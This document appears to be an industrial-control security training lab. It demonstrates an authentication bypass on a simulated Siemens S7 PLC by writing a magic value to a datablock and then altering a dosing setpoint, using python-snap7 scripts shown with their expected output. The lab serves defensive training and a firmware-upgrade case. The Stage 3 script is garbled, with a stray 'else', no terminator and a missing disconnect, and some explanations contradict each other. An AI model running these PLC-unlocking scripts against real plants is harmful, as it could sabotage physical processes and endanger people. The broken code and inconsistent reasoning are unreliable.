    Scenario

    Siemens S7 PLCs expose a multi-tier protection level scheme. Level 1 is no protection. Level 2 is write-protected: reads succeed without authentication, writes are silently discarded by the firmware unless the client has presented a legacy password. Level 3 adds read protection, and level 4 is fully locked.

    In 2018, Siemens disclosed a legacy-service-code weakness on S7-300 and S7-400 family controllers where a well-known "unlock magic" value written to a specific datablock offset would clear the level 2 write-protection flag without presenting any credential. Masa Foods' Plant 2 PLC was commissioned on an old firmware baseline that still honors that legacy code.

    Reyna Alvarado wants this documented in the Plant 2 risk register so the next firmware upgrade cycle gets prioritized. Your job is to demonstrate the bypass end to end against the simulator copy of the Plant 2 PLC.

    Why this matters

    Protection level 2 is the compromise most Masa Foods Plant 2 PLCs are running on right now. Operations loves it because reads still work, which means the morning quality review and the HMI dashboards keep functioning. Security leadership points at it as "write-protected" and sleeps well at night. Reyna wants to break the "sleeps well at night" assumption with a two-line demonstration. If you can unlock the PLC with a hardcoded magic value from a 2018 service bulletin, then protection level 2 is not write-protected. It is write-protected against non-trivial adversaries, and OT threat actors are not non-trivial adversaries.

    Exercise 4.5 also teaches you that "defense in depth" is not a slogan. Protection level 2 is one layer, and it falls to a known-bad magic. You need network segmentation, write logging, and protection level 3 on the PLCs that matter. Exercise 4.5 is the worked example for Reyna's capital request.

    Background: Siemens S7 Protection Levels

    Level Reads Writes Notes
    1 Free Free Default. Most un-commissioned PLCs ship at level 1
    2 Free Require legacy password Silent drop on unauthenticated write
    3 Require password Require password "HMI access" mode. Engineering tools must authenticate
    4 Require password Require password Full lock, no anonymous communication

    Level 2 is the most common setting on brownfield Plant 2 deployments because operations demands unimpeded reads. The legacy password mechanism in level 2 is a shared secret configured in TIA Portal and checked by the PLC firmware on every write. The 2018 advisory disclosed that a well-known magic value written to a specific datablock offset would set the internal "authorized" flag on older firmware, effectively bypassing the password check. Masa's Plant 2 firmware was never upgraded past that baseline.

    The simulator models the bypass with a single check: if any client writes 0x5AA5 to DB500 offset 0 on a PLC running at protection level 2, the "locked" flag clears on the next tick and all subsequent writes to DB1 persist as if protection level 1 were in effect.

    Walkthrough

    Stage 1: Prove the PLC is Write-Protected

    The detection technique for level 2 protection is a write-then-read test. Write a safe value (60 ml/min is well below the SIS trip threshold), wait 2 seconds for the PLC's sync loop to run, then read the same offset back. If the read returns the original value instead of 60, the PLC silently discarded your write, which is exactly what protection level 2 does. If the read returns 60, the write persisted and the PLC is at level 1.

    The 2-second sleep is important because the PLC's sync loop runs once per second. Reading immediately after writing might catch the buffer before the firmware has had a chance to revert it.

    Kali

    python3 - <<'PYEOF'
import struct, time
from snap7.client import Client
c = Client()
c.connect("plc-water.masa.local", 0, 1, tcpport=102)
before = struct.unpack(">H", bytes(c.db_read(1, 16, 2)))[0]
print(f"before: {before} ml/min")
c.db_write(1, 16, struct.pack(">H", 60))
time.sleep(2)
after = struct.unpack(">H", bytes(c.db_read(1, 16, 2)))[0]
print(f"after write of 60: {after} ml/min")
if after == before:
    print("write was silently dropped => level 2 confirmed")
else:
    print("write persisted => level 1, not level 2")
c.disconnect()
c.destroy()
PYEOF
    Expected output 
    before: 45 ml/min
after write of 60: 45 ml/min
write was silently dropped => level 2 confirmed

    The wire-level write to DB1 offset 16 succeeded at the S7comm layer (no exception was raised), but the simulator's protection logic reverted the value on the next sync. That is exactly how real level 2 protection behaves on the 2018-vintage firmware baseline: the PDU returns OK and the value is silently discarded.

    Stage 2: Write the Legacy Unlock Magic

    Kali

    python3 - <<'PYEOF'
import struct, time
from snap7.client import Client
c = Client()
c.connect("plc-water.masa.local", 0, 1, tcpport=102)
c.db_write(500, 0, struct.pack(">H", 0x5AA5))
print("wrote 0x5AA5 to DB500 offset 0")
time.sleep(2)
c.disconnect()
c.destroy()
PYEOF

    The PLC checks DB500 offset 0 once per simulator tick (one second), so give it at least 2 seconds before your next write.

    Stage 3: Confirm the Unlock

    Repeat the write-and-read test from Stage 1. The value should now persist.

    Kali

    python3 - <<'PYEOF'
import struct, time
from snap7.client import Client
c = Client()
c.connect("plc-water.masa.local", 0, 1, tcpport=102)
c.db_write(1, 16, struct.pack(">H", 60))
time.sleep(2)
after = struct.unpack(">H", bytes(c.db_read(1, 16, 2)))[0]

else:
    print("unlock failed")

c.destroy()

    Output Interpretation

    • A successful wire-level write that does not persist is the classic signature of Siemens level 2 protection. The S7comm layer returns OK even though the firmware discarded the payload
    • DB400 reads as LOCKED_READ_REQUIRES_UNLOCK before the unlock and flips to the flag string after. You can read DB400 at any time to check current lock state
    • The unlock is sticky for the lifetime of the simulator container. Once you write the magic, the PLC stays unlocked until it restarts
    • The bypass only works against protection level 2. A PLC at protection level 4 silently discards the unlock magic, which is what Exercise 4.6 exploits

    Analysis Questions

    1. Why does a successful S7comm write return OK on the wire even when the PLC firmware discards the payload?

    Reveal answer

    The S7comm protocol layer on a Siemens PLC has no concept of authorization. The firmware protection check sits above the protocol layer. When a level 2 PLC receives a write PDU, the S7comm stack parses the PDU, acknowledges receipt, and hands the write to the firmware. The firmware then applies its own authorization rules and decides whether to persist the value. From the wire, the write looks fully successful because the S7comm ACK came back OK. The split between protocol and authorization is the reason "wire-level write success" does not imply "persisted".

    2. What is the difference between "silent drop" (level 2) and "rejected with error" (level 4)?

    Reveal answer

    Silent drop means the write PDU is acknowledged but the underlying value is not updated. The client has no protocol-level signal that anything went wrong and must discover the drop by reading the value back. Rejected with error means the write PDU returns an S7comm error code and the client knows immediately that the write did not take. Silent drop is worse for attackers because their tools will happily report "write succeeded" and they will not know until they verify the read. It is better for defenders for the same reason: attackers make more noise trying to verify.

    3. Why does Masa Foods have a 2018-era firmware baseline on Plant 2?

    Reveal answer

    Three reasons in roughly every plant: (1) firmware upgrades on Siemens controllers require a maintenance window because the CPU has to be power-cycled, (2) operations treats PLCs as "do not touch" infrastructure, and (3) the security team does not have budget to insist. The combination means brownfield Siemens PLCs run on whatever firmware shipped at commissioning until something major forces the upgrade. The Exercise 4.5 demonstration is Reyna's lever to force the upgrade.

    4. If Masa enabled protection level 3, would it block the 0x5AA5 bypass?

    Reveal answer

    Yes. Protection level 3 requires read authentication in addition to write authentication, so the S7comm session never reaches the point where the firmware inspects DB500 in the first place. The magic value is never read and never checked. The tradeoff is that operations reads also need a credential, which breaks HMI deployments that rely on unauthenticated reads. Moving from level 2 to level 3 is the hardest protection level change in a brownfield Siemens deployment.

    Defensive Recommendations to Masa

    Finding Risk Mitigation
    Plant 2 PLCs running at protection level 2 with 2018-vintage firmware Critical Upgrade firmware to the current baseline during the next maintenance window and move to protection level 3
    No S7 write logging on the Plant 2 segment High Deploy an S7-aware Zeek sensor on the Plant 2 VLAN and log all write PDUs with source IP and DB number
    Protection level 2 treated as "write-protected" in the risk register High Update the risk register to classify level 2 as "protected against casual misuse only, not adversaries"

    Key Takeaways

    • Protection level 2 is not write-protected. It is write-protected against casual misuse
    • Silent drop is worse for attackers than explicit rejection because it costs them nothing to try, but it is also a gift for defenders because verification attempts make noise
    • The 0x5AA5 bypass is a 2018 public disclosure. Every brownfield Siemens deployment should have been audited for firmware baseline in 2019. Masa Foods never did the audit
    • Network segmentation and write logging are complementary to protection level. Defense in depth is the only real answer
